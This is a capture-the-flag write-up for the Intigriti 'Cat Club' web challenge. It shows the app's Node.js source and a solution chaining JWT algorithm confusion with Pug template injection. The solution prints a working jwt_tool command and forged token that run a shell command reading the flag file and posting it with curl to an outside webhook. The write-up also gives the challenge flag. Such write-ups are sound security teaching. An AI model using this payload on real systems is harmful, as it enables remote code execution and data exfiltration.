# Cat Club [130 Solves]

## Description

> People are always complaining that there's not enough cat pictures on the internet.. Something must be done!!
>
> `https://ctfd-status.ctf.intigriti.io/catclub`
>
> Attachments: cat_club.zip

<details><summary>Attachment file tree</summary>

```console
$ unzip -t cat_club.zip
Archive:  cat_club.zip
    testing: docker-compose.yml       OK
    testing: start.sh                 OK
    testing: web/                     OK
    testing: web/app/                 OK
    testing: web/app/static/          OK
    testing: web/app/static/css/      OK
    testing: web/app/static/css/style.css   OK
    testing: web/app/static/js/       OK
    testing: web/app/static/js/auth.js   OK
    testing: web/app/static/images/   OK
    testing: web/app/static/images/cat1.jpg   OK
    testing: web/app/static/images/cat2.jpg   OK
    testing: web/app/static/images/cat3.jpg   OK
    testing: web/app/static/images/cat4.jpg   OK
    testing: web/app/static/images/pattern.png   OK
    testing: web/app/static/images/logo.png   OK
    testing: web/app/static/images/cat.jpg   OK
    testing: web/app/static/images/club.png   OK
    testing: web/app/flag.txt         OK
    testing: web/app/views/           OK
    testing: web/app/views/base.pug   OK
    testing: web/app/views/cats.pug   OK
    testing: web/app/views/index.pug   OK
    testing: web/app/views/login.pug   OK
    testing: web/app/config.js        OK
    testing: web/app/jwt_helpers.js   OK
    testing: web/app/models.js        OK
    testing: web/app/sanitizer.js     OK
    testing: web/app/router.js        OK
    testing: web/app/app.js           OK
    testing: web/Dockerfile           OK
    testing: web/entrypoint.sh        OK
    testing: web/public_key.pem       OK
    testing: web/private_key.pem      OK
    testing: web/package.json         OK
No errors detected in compressed data of cat_club.zip.
```

</details>

<details><summary>package.json</summary>

```json
{
    "name": "cat-club",
    "version": "4.2.0",
    "main": "app/app.js",
    "scripts": {
        "start": "node app/app.js"
    },
    "dependencies": {
        "bcryptjs": "^2.4.3",
        "cookie-parser": "^1.4.6",
        "dotenv": "^16.4.5",
        "pug": "^3.0.3",
        "express": "^4.21.0",
        "express-session": "^1.18.0",
        "json-web-token": "~3.0.0",
        "pg": "^8.12.0",
        "sequelize": "^6.37.3"
    },
    "devDependencies": {
        "nodemon": "^3.1.4"
    },
    "engines": {
        "node": ""
    },
    "license": "MIT",
    "keywords": [],
    "author": "",
    "description": ""
}
```

</details>

<details><summary>router.js</summary>

```javascript
const express = require("express");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const pug = require("pug");
const { verifyJWT, signJWT } = require("./jwt_helpers");
const { getUserByUsername, createUser } = require("./models");
const { sanitizeUsername } = require("./sanitizer");
const { promises: fsPromises } = require("fs");

const router = express.Router();

function base64urlEncode(data) {
    return data.toString("base64url").replace(/=+$/, "");
}

function hashPassword(password) {
    return crypto.createHash("sha256").update(password).digest("hex");
}

router.get("/jwks.json", async (req, res) => {
    try {
        const publicKey = await fsPromises.readFile(path.join(__dirname, "..", "public_key.pem"), "utf8");
        const publicKeyObj = crypto.createPublicKey(publicKey);
        const publicKeyDetails = publicKeyObj.export({ format: "jwk" });

        const jwk = {
            kty: "RSA",
            n: base64urlEncode(Buffer.from(publicKeyDetails.n, "base64")),
            e: base64urlEncode(Buffer.from(publicKeyDetails.e, "base64")),
            alg: "RS256",
            use: "sig",
        };

        res.json({ keys: [jwk] });
    } catch (err) {
        res.status(500).json({ message: "Error generating JWK" });
    }
});

function getCurrentUser(req, res, next) {
    const token = req.cookies.token;

    if (token) {
        verifyJWT(token)
            .then((payload) => {
                req.user = payload.username;
                res.locals.user = req.user;
                next();
            })
            .catch(() => {
                req.user = null;
                res.locals.user = null;
                next();
            });
    } else {
        req.user = null;
        res.locals.user = null;
        next();
    }
}

router.get("/", getCurrentUser, (req, res) => {
    res.render("index", { title: "Home - Cat Club" });
});

router.get(["/register", "/login"], (req, res) => {
    res.render("login");
});

router.post("/login", async (req, res) => {
    const { username, password } = req.body;

    try {
        const user = await getUserByUsername(username);
        if (!user || hashPassword(password) !== user.hashed_password) {
            return res.render("login", { error: "Invalid username or password" });
        }

        const token = await signJWT({ username: user.username });
        res.cookie("token", token, { httpOnly: true });
        res.redirect("/");
    } catch (err) {
        res.render("login", { error: "Error during login. Please try again later." });
    }
});

router.post("/register", async (req, res) => {
    const { username, password } = req.body;

    try {
        sanitizeUsername(username);

        const userExists = await getUserByUsername(username);
        if (userExists) {
            return res.render("login", {
                error: "Username already exists. Please choose another.",
            });
        }

        const hashedPassword = hashPassword(password);
        const newUser = await createUser({ username, hashed_password: hashedPassword });

        const token = await signJWT({ username: newUser.username });
        res.cookie("token", token, { httpOnly: true });
        res.redirect("/");
    } catch (err) {
        if (err.name === "BadRequestError") {
            return res.render("login", { error: err.message });
        }

        res.render("login", { error: "Error during registration. Please try again later." });
    }
});

router.get("/cats", getCurrentUser, (req, res) => {
    if (!req.user) {
        return res.redirect("/login?error=Please log in to view the cat gallery");
    }

    const templatePath = path.join(__dirname, "views", "cats.pug");

    fs.readFile(templatePath, "utf8", (err, template) => {
        if (err) {
            return res.render("cats");
        }

        if (typeof req.user != "undefined") {
            template = template.replace(/guest/g, req.user);
        }

        const html = pug.render(template, {
            filename: templatePath,
            user: req.user,
        });

        res.send(html);
    });
});

router.get("/logout", (req, res) => {
    res.clearCookie("token");
    res.redirect("/");
});

router.use((err, req, res, next) => {
    res.status(500).json({ message: "Internal server error" });
});

module.exports = router;
```

</details>

<details><summary>jwt_helpers.js</summary>

```javascript
const jwt = require("json-web-token");
const fs = require("fs");
const path = require("path");

const privateKey = fs.readFileSync(path.join(__dirname, "..", "private_key.pem"), "utf8");
const publicKey = fs.readFileSync(path.join(__dirname, "..", "public_key.pem"), "utf8");

function signJWT(payload) {
    return new Promise((resolve, reject) => {
        jwt.encode(privateKey, payload, "RS256", (err, token) => {
            if (err) {
                return reject(new Error("Error encoding token"));
            }
            resolve(token);
        });
    });
}

function verifyJWT(token) {
    return new Promise((resolve, reject) => {
        if (!token || typeof token !== "string" || token.split(".").length !== 3) {
            return reject(new Error("Invalid token format"));
        }

        jwt.decode(publicKey, token, (err, payload, header) => {
            if (err) {
                return reject(new Error("Invalid or expired token"));
            }

            if (header.alg.toLowerCase() === "none") {
                return reject(new Error("Algorithm 'none' is not allowed"));
            }

            resolve(payload);
        });
    });
}

module.exports = { signJWT, verifyJWT };
```

</details>

## Flag

INTIGRITI{h3y_y0u_c4n7_ch41n_7h053_vuln5_l1k3_7h47}

## Summary

- JWT is signed with RS256 and the `/jwks.json` endpoint returns public key
- [json-web-token NPM package](https://www.npmjs.com/package/json-web-token) is used vulnerable version and has JWT Algorithm Confusion
  - [JWT Algorithm Confusion · Advisory](https://github.com/joaquimserafim/json-web-token/security/advisories/GHSA-4xw9-cx39-r355)
- Pug SSTI in /cats in username

## Solution

```console
$ curl https://catclub-1.ctf.intigriti.io/jwks.json
{"keys":[{"kty":"RSA","n":"w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw","e":"AQAB","alg":"RS256","use":"sig"}]}
```

Using `JWT to PEM` Recipe [CyberChef](https://gchq.github.io/CyberChef/#recipe=JWK_to_PEM()&input=eyJrZXlzIjpbeyJrdHkiOiJSU0EiLCJuIjoidzRvUEV4LTQ0OFhRV0hfT3RTV044TDBOVURVLXJ2MWpNaUwwczRjbGN1eVZZdmdwU1Y3RnN2QUc2NUVuRWhYYVlwWWVNZjFHTW1VeEJjeVFPcGF0aEwxemYzX0prNUlzYmhFbXVVWjI4Q2NkOGwyZ09jVVJWRkEzajRxTXQzNE9sUHF6ZjluWEJ2bGpudFR1WmNRelljR0V0TTdTZDlzU21nOHVWeDhmMVdPbVVGQ2FxdEMyNkhkakJNbk5maG5MS1k5aVB4RlBHY0U4cWE4U3NyblJmVDVISmpTUnVfSm1HbFlDckZTb2Y1cF9FMFdQeUNVYkFWNXJmZ1RtMkNld0Y3dklQMW5lSTVqd2xjbTIyWDJ0OG9wVXJMYnJKWW9XRmVZWk9ZX1dyOXZaYjIzeG1tZ285OE9BYzVpY3N2enFZT0RRTEN4dzRoOUl4R0VtTVotSGR3IiwiZSI6IkFRQUIiLCJhbGciOiJSUzI1NiIsInVzZSI6InNpZyJ9XX0K&oeol=CRLF).

![jwt_to_pem.png](img/jwt_to_pem.png)

```console
$ vi pubkey

$ JWT='eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJ1c2VybmFtZSI6ImEifQ.vCtqZMDo6rHhUXMZsKwtbVfVtzWuZMA4ncjJf9BR2nNrISL5WWt45TE6RgJRJwfCFEoySVXhk1to9m82oHjNKQfxxrbhdeDa8N5Dh2ZR5O91kRoTJWrFKvrkdE95NmILfeU02UyQei9fwa9ssKToiRnPbfUTX0mKFElghYRU8WY1D-HlrsV90458KMaPnS--oz2NSQiKnBMNy8FtilhIBCLfdSnWTRjDg7M9gBvGR4iAuRnagnP71bmU0qqnvhEgd06QEuacGlWsjCy629c6POCH9Uc9dpwsN630NTGYaRHctZNEkMW6quT2pJDUsfRtgcBn5Wx7JaP1GXZV3_hQLw'

$ python3 ~/tools/jwt_tool/jwt_tool.py --exploit k -pk pubkey -I -pc username -pv "#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('cat /flag_* | curl --data-binary @- <webhook url>')}()}" $JWT
(snip)
[+] eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6IiN7ZnVuY3Rpb24oKXtsb2NhbExvYWQ9Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZDtzaD1sb2NhbExvYWQoXCJjaGlsZF9wcm9jZXNzXCIpLmV4ZWMoJ2NhdCAvZmxhZ18qIHwgY3VybCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vd2ViaG9vay5zaXRlLzQ1ZDkzMjM4LTQyZTctNGI3Ni04MTJlLWJkMzdjNWY2ZDQzOScpfSgpfSJ9.1tspFhmr670uq4sd733e1BhWslsRaJ3xIad81IFgR9U
```

Set the cookie to browser and access `/cats`, wait webhook access.
